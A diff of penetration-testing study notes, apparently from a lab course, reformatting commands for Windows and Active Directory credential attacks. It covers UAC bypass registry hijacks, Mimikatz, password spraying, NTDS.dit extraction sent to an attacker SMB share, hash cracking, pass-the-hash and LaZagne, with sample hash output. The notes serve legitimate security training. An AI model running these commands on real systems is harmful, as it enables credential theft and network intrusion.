+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 rundll32 keymgr.dll,KRShowKeyMgr
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3163,27 +3914,82 @@ We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administrat
 
 If you're using xFreeRDP, you can share [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master) with the remote system by mounting a local folder as a shared drive:
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>' /drive:share,/home/<USER>/mimikatz
 ```
 
+</td>
+</tr>
+</table>
+
 > This command maps the local /home/<USER>/mimikatz directory to a drive named share on the remote desktop session, allowing easy access to the Mimikatz binaries from within the RDP environment.
 
-1. **Verify the current user**
+1. **Verify** the current user
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 whoami
 ```
 
-2. **Enumerate the credentials**
+</td>
+</tr>
+</table>
+
+2. **Enumerate** the credentials
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 cmdkey /list
 ```
 
+</td>
+</tr>
+</table>
+
 Currently stored credentials:
 
-```cmd
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Output</b> </td>
+</tr>
+<tr>
+<td>
+
+```
 Target: WindowsLive:target=virtualapp/didlogical
 Type: Generic
 User: 02hejubrtyqjrkfi
@@ -3194,6 +4000,10 @@ Type: Domain Password
 User: SRV01\herman
 ```
 
+</td>
+</tr>
+</table>
+
 Stored credentials are listed with the following format:
 
 | Key          | Value Description |
@@ -3203,62 +4013,190 @@ Stored credentials are listed with the following format:
 | **User**     | The user account associated with the credential. |
 | **Persistence** | Indicates whether a credential is saved persistently on the computer. Credentials marked with `Local machine` persistence survive reboots. |
 
-3. **Use runas to impersonate the stored user like so**
+3. **Impersonate** the stored user with runas
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 runas /savecred /user:SRV01\herman cmd
 ```
 
-4. **UAC Bypass Techniques**
+</td>
+</tr>
+</table>
 
-Option 1: FodHelper Exploit
+4. **Bypass** UAC (if needed)
+
+**Option 1: FodHelper Exploit**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
 ```
 
-Option 2: ComputerDefaults Exploit 
+</td>
+</tr>
+</table>
+
+**Option 2: ComputerDefaults Exploit**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
 ```
 
-5. **Navigating to Administrator Profile**
+</td>
+</tr>
+</table>
+
+5. **Navigate** to Administrator Profile
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 cd C:\Users\Administrator
 ```
 
-6. **Clear registry modifications post-exploitation**
+</td>
+</tr>
+</table>
+
+6. **Clear** registry modifications post-exploitation
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 reg delete HKCU\Software\Classes\ms-settings /f
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
 <details>
 <summary><h3>Extracting credentials with Mimikatz</h3></summary>
 
-**Launch Mimikatz**
+1. **Launch** Mimikatz
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe
 ```
 
-**Enable Debug Privileges**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # privilege::debug
+2. **Enable** Debug Privileges
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
+```
+privilege::debug
 ```
 
-**Dump Credential Manager Secrets**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # sekurlsa::credman
+3. **Dump** Credential Manager Secrets
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
+```
+sekurlsa::credman
 ```
 
-> **NOTE:**  Some other tools which may be used to enumerate and extract stored credentials included **SharpDPAPI**, **LaZagne**, and **DonPAPI**.
+</td>
+</tr>
+</table>
+
+> **NOTE:** Some other tools which may be used to enumerate and extract stored credentials include **SharpDPAPI**, **LaZagne**, and **DonPAPI**.
 
 </details>
 
@@ -3330,13 +4268,41 @@ After gathering employee names from OSINT research (e.g., LinkedIn, company webs
 * Jill Johnson  
 * Jane Doe  
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 nano ~/names.txt
 ```
 
+</td>
+</tr>
+</table>
+
 We can create a custom list using an automated list generator such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.
 
-**Install**
+1. **Install** Username Anarchy
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -3344,13 +4310,33 @@ cd username-anarchy
 chmod +x username-anarchy
 ```
 
-**Usage**
+</td>
+</tr>
+</table>
+
+2. **Generate** usernames
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 ./username-anarchy -i ~/names.txt > ~/usernames.txt
 ```
 
-> While automated tools accelerate list generation, investing time in identifying an organization’s exact username convention significantly improves attack success rates.
+</td>
+</tr>
+</table>
+
+> While automated tools accelerate list generation, investing time in identifying an organization's exact username convention significantly improves attack success rates.
 
 </details>
 
@@ -3359,7 +4345,19 @@ chmod +x username-anarchy
 
 Before initiating password-based attacks, verifying username validity prevents wasted effort on non-existent accounts. Kerbrute streamlines this process.
 
-**Install**
+1. **Install** Kerbrute
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
@@ -3367,19 +4365,47 @@ chmod +x kerbrute
 sudo mv kerbrute /usr/local/bin/
 ```
 
-**Usage**
+</td>
+</tr>
+</table>
+
+2. **Enumerate** valid usernames
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 kerbrute userenum --dc <DC_IP> -d exampledomain.local ~/usernames.txt
 ```
-```bash
-# ...
-# 2025/04/25 09:17:10 >  Using KDC(s):
-# 2025/04/25 09:17:10 >   <DC_IP>:<PORT>
 
-# 2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@exampledomain.local
-# ...
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+...
+2025/04/25 09:17:10 >  Using KDC(s):
+2025/04/25 09:17:10 >   <DC_IP>:<PORT>
+
+2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@exampledomain.local
+...
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3390,36 +4416,90 @@ Once we've identified the naming convention and gathered employee names or prepa
 
 **Option 1: crackmapexec**
 
-Wordlist
+With wordlist:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 crackmapexec smb <DC_IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt | grep "+"
 ```
 
-Username
+</td>
+</tr>
+</table>
+
+With single username:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 crackmapexec smb <DC_IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+"
 ```
 
+</td>
+</tr>
+</table>
+
 **Option 2: netexec**
 
-**Usage**
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 netexec smb <DC_IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 ```
-```bash
-# SMB         <DC_IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
-# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
-# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
-# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
-# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
-# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
-# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
-# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
-# SMB         <DC_IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd! 
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+SMB         <DC_IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
+SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE
+SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE
+SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE
+SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE
+SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE
+SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE
+SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE
+SMB         <DC_IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd!
+```
+
+</td>
+</tr>
+</table>
 
 In this example, NetExec uses SMB to attempt a login as user bwilliamson (-u) with a password list (-p) of common passwords located at `/usr/share/wordlists/fasttrack.txt`. Be aware that if an account lockout policy is in place, this attack could lock the targeted account.
 
@@ -3442,36 +4522,73 @@ We have two options to obtain this file:
 <details>
 <summary><h4>Option 1: Automatic</h4></summary>
 
-Using crackmapexec to capture NTDS.dit
+Using crackmapexec to capture NTDS.dit:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>' --ntds drsuapi
 ```
-```bash
-# [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
-# SMB         <DC_IP>   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
-# SMB         <DC_IP>   445    ILF-DC01         [+] ILF.local\<USER>:<PASSWORD> (Pwn3d!)
-# SMB         <DC_IP>   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
-# SMB         <DC_IP>   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
-# SMB         <DC_IP>   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# SMB         <DC_IP>   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
-# SMB         <DC_IP>   445    ILF-DC01         ILF.local\<USER>:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
-# SMB         <DC_IP>   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
-# SMB         <DC_IP>   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
-# SMB         <DC_IP>   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
-# SMB         <DC_IP>   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ad36b2c78047b7d2b6c64a17225ed0c8:::
-# SMB         <DC_IP>   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
-# SMB         <DC_IP>   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC_IP>_2025-07-10_115224.ntds of which 7 were added to the database
-# SMB         <DC_IP>   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command:
-# SMB         <DC_IP>   445    ILF-DC01         [*] cat /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC_IP>_2025-07-10_115224.ntds | grep -iv disabled | cut -d ':' -f1
-# SMB         <DC_IP>   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC_IP>_2025-07-10_115224.ntds | cut -d ':' -f1
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
+SMB         <DC_IP>   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
+SMB         <DC_IP>   445    ILF-DC01         [+] ILF.local\<USER>:<PASSWORD> (Pwn3d!)
+SMB         <DC_IP>   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         <DC_IP>   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+SMB         <DC_IP>   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         <DC_IP>   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
+SMB         <DC_IP>   445    ILF-DC01         ILF.local\<USER>:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
+SMB         <DC_IP>   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
+SMB         <DC_IP>   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
+SMB         <DC_IP>   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
+SMB         <DC_IP>   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ad36b2c78047b7d2b6c64a17225ed0c8:::
+SMB         <DC_IP>   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
+SMB         <DC_IP>   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/user/.nxc/logs/ILF-DC01_<DC_IP>_2025-07-10_115224.ntds
 ```
 
-Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.
+</td>
+</tr>
+</table>
+
+Then, we can save the hashes in a file:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 cat <FILE.NTDS> | cut -d ':' -f4 | sort -u > hashes_ntlm.txt
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3483,9 +4600,25 @@ cat <FILE.NTDS> | cut -d ':' -f4 | sort -u > hashes_ntlm.txt
 
 We can connect to a target DC using the credentials we captured.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
-evil-winrm -i <DC_IP>  -u <USERNAME> -p <PASSWORD>
+evil-winrm -i <DC_IP> -u <USERNAME> -p <PASSWORD>
 ```
+
+</td>
+</tr>
+</table>
 
 > Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
 
@@ -3494,17 +4627,49 @@ evil-winrm -i <DC_IP>  -u <USERNAME> -p <PASSWORD>
 <details>
 <summary><h5>Checking local group membership</h5></summary>
 
-Once connected, we can check to see what privileges this user has. 
+Once connected, we can check to see what privileges this user has.
 
-```bash
-*Evil-WinRM* PS C:\> net localgroup
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
+
+```powershell
+net localgroup
 ```
+
+</td>
+</tr>
+</table>
 
 We also will want to check what domain privileges we have.
 
-```bash
-*Evil-WinRM* PS C:\> net user <USERNAME>
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
+
+```powershell
+net user <USERNAME>
 ```
+
+</td>
+</tr>
+</table>
 
 We're checking whether the account has administrative privileges. To copy the `NTDS.dit` file, the account must have local administrator (Administrators group) or domain administrator (Domain Admins group) — or equivalent — privileges.
 
@@ -3517,17 +4682,41 @@ This account has both Administrators and Domain Administrator rights which means
 
 We can use vssadmin to create a [Volume Shadow Copy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.
 
-```bash
-*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
-```
-```bash
-# vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
-# (C) Copyright 2001-2013 Microsoft Corp.
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td>
+</tr>
+<tr>
+<td width="20%">
 
-# Successfully created shadow copy for 'C:\'
-#     Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
-#     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+**`PS C:\>`**
+
+</td>
+<td>
+
+```powershell
+vssadmin CREATE SHADOW /For=C:
 ```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+```
+
+</td>
+</tr>
+</table>
 
 > It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.
 
@@ -3540,24 +4729,72 @@ We can use vssadmin to create a [Volume Shadow Copy](https://learn.microsoft.com
 
 We can then copy the `NTDS.dit` file from the volume shadow copy of the C: drive to another location on the system, preparing it for transfer to our attack host.
 
-```bash
-*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\NTDS>`**
+
+</td>
+<td>
+
+```powershell
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
 
-Then, transfer the files from the target machine to the attack machine
+</td>
+</tr>
+</table>
 
-**Attack Machine:** Create a share with smbserver
+Then, transfer the files from the target machine to the attack machine.
+
+Create a share with smbserver on the attack machine:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 mkdir ~/ntds
 sudo smbserver.py -smb2support share ~/ntds
 ```
 
-**Target Machine:** Transfer the hive copies to the share
+</td>
+</tr>
+</table>
 
-```bash
-*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER IP>\share 
+Transfer the files from the target to the share:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Evil-WinRM</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\NTDS>`**
+
+</td>
+<td>
+
+```powershell
+cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER_IP>\share
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3566,10 +4803,26 @@ sudo smbserver.py -smb2support share ~/ntds
 
 With a copy of NTDS.dit on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's secretsdump:
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 cd ~/ntds
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
+
+</td>
+</tr>
+</table>
 
 Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.
 
@@ -3584,9 +4837,25 @@ Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.
 
 In many of the techniques we've covered, we've successfully cracked the hashes we've obtained.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 sudo hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
 ```
+
+</td>
+</tr>
+</table>
 
 But what happens if we're unable to crack a hash?
 
@@ -3597,9 +4866,25 @@ But what happens if we're unable to crack a hash?
 
 We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 evil-winrm -i <DC_IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3669,12 +4954,32 @@ Some of the common modules are described in the table below:
 
 It's a good practice to keep the latest [LaZagne executable](https://github.com/AlessandroZ/LaZagne/releases/) on our attack host, allowing us to quickly transfer it to the target system when needed.
 
-**Target Machine: Run LaZagne**
+**Run LaZagne**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 start LaZagne.exe all
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 |====================================================================|
 |                                                                    |
 |                        The LaZagne Project                         |
@@ -3695,6 +5000,10 @@ Password: SteveisReallyCool123
 Port: 22
 ```
 
+</td>
+</tr>
+</table>
+
 </details>
 
 <details>
@@ -3702,9 +5011,25 @@ Port: 22
 
 We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:
 
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3780,9 +5105,20 @@ Linux systems primarily authenticate users through Pluggable Authentication Modu
 
 The /etc/passwd file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of seven fields, which store user-related data in a structured format. These fields are separated by colons (:). As such, a typical entry may look something like this:
 
-```bash
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Text — /etc/passwd entry</b> </td>
+</tr>
+<tr>
+<td>
+
+```
 john:x:1000:1000:,,,:/home/john:/bin/bash
 ```
+
+</td>
+</tr>
+</table>
 
 | Field           | Value               |
 |-----------------|---------------------|
@@ -3794,27 +5130,75 @@ john:x:1000:1000:,,,:/home/john:/bin/bash
 | Home directory  | /home/john          |
 | Default shell   | /bin/bash           |
 
-The most important field for our purposes in the `/etc/passwd` file is the password field, which can contain different types of entries. On very old systems, this field may hold the actual password hash, but on modern systems, password hashes are stored in /etc/shadow, which we’ll examine later.
+The most important field for our purposes in the `/etc/passwd` file is the password field, which can contain different types of entries. On very old systems, this field may hold the actual password hash, but on modern systems, password hashes are stored in /etc/shadow, which we'll examine later.
 
 Since `/etc/passwd` is world-readable, if hashes are present here, they can be cracked by an attacker. Typically, you'll see an **x** in the password field, indicating that the actual password hash is in `/etc/shadow`.
 
 However, if `/etc/passwd` is writable—which is a misconfiguration—an attacker could modify the file, such as by removing the password for the root user entirely:
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
+
 ```bash
 head -n 1 /etc/passwd
 ```
-```bash
-# root::0:0:root:/root:/bin/bash
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+root::0:0:root:/root:/bin/bash
 ```
 
+</td>
+</tr>
+</table>
+
 This results in no password prompt being displayed when attempting to log in as root.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 su
 ```
-```bash
-# root@john[/john]#
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+root@john[/john]#
+```
+
+</td>
+</tr>
+</table>
 
 Although the scenarios described are rare, we should still pay attention and watch for potential security gaps, as there are applications that require specific permissions fon entire folders.
 
@@ -3827,9 +5211,20 @@ To better protect password hashes, the `/etc/shadow` file was introduced. While 
 
 The `/etc/shadow` file is only readable by users with administrative privileges, reducing the risk of unauthorized access. Each line in the file represents a user and is divided into nine fields, including the username, hashed password, and password policy information.
 
